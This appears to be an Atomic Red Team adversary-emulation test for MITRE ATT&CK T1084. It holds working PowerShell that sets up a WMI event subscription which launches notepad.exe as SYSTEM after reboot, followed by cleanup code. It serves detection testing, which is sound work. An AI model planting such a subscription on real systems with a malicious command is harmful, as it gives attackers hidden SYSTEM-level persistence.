# Windows Management Instrumentation Event Subscription

## MITRE ATT&CK Technique:
[T1084](https://attack.mitre.org/wiki/Technique/T1084)

### Persistence

#### Example:
```powershell
#Run from an administrator powershell window
#Code references
#https://gist.github.com/mattifestation/7fe1df7ca2f08cbfa3d067def00c01af
#https://github.com/EmpireProject/Empire/blob/master/data/module_source/persistence/Persistence.psm1#L545

$FilterArgs = @{name='AtomicRedTeam-WMIPersistence-Example';
                EventNameSpace='root\CimV2';
                QueryLanguage="WQL";
                Query="SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System' AND TargetInstance.SystemUpTime >= 240 AND TargetInstance.SystemUpTime < 325"};
$Filter=New-CimInstance -Namespace root/subscription -ClassName __EventFilter -Property $FilterArgs

$ConsumerArgs = @{name='AtomicRedTeam-WMIPersistence-Example';
                CommandLineTemplate="$($Env:SystemRoot)\System32\notepad.exe";}
$Consumer=New-CimInstance -Namespace root/subscription -ClassName CommandLineEventConsumer -Property $ConsumerArgs

$FilterToConsumerArgs = @{
Filter = [Ref] $Filter
Consumer = [Ref] $Consumer
}
$FilterToConsumerBinding = New-CimInstance -Namespace root/subscription -ClassName __FilterToConsumerBinding -Property $FilterToConsumerArgs
```

### After running, reboot the victim machine. After it has been online for 4 minutes you should see notepad.exe running as SYSTEM.


### Cleanup:
```powershell
#Run from an administrator powershell window
#Code references
#https://gist.github.com/mattifestation/7fe1df7ca2f08cbfa3d067def00c01af
#https://github.com/EmpireProject/Empire/blob/master/data/module_source/persistence/Persistence.psm1#L545

$EventConsumerToCleanup = Get-WmiObject -Namespace root/subscription -Class CommandLineEventConsumer -Filter "Name = 'AtomicRedTeam-WMIPersistence-Example'"
$EventFilterToCleanup = Get-WmiObject -Namespace root/subscription -Class __EventFilter -Filter "Name = 'AtomicRedTeam-WMIPersistence-Example'"
$FilterConsumerBindingToCleanup = Get-WmiObject -Namespace root/subscription -Query "REFERENCES OF {$($EventConsumerToCleanup.__RELPATH)} WHERE ResultClass = __FilterToConsumerBinding"

$FilterConsumerBindingToCleanup | Remove-WmiObject
$EventConsumerToCleanup | Remove-WmiObject
$EventFilterToCleanup | Remove-WmiObject
```

#### References

https://gist.github.com/mattifestation/7fe1df7ca2f08cbfa3d067def00c01af
https://github.com/EmpireProject/Empire/blob/master/data/module_source/persistence/Persistence.psm1#L545
